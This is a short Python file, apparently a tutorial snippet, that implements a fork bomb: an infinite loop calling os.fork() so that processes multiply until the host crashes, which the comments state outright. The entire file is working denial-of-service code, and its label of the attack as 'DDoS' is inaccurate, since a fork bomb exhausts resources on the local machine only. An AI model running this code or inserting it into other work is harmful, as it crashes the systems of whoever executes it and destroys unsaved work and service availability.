# Implementing fork bomb DDoS in Python
# A fork bomb is a code in which a process calls in another process by using the fork functionality
# This code WILL CRASH the system on which it executes

# We will first import the OS module
import os

# Now, we will create an infinite loop which will implement the fork functionality and kep creating new processes
while True:
    os.fork()
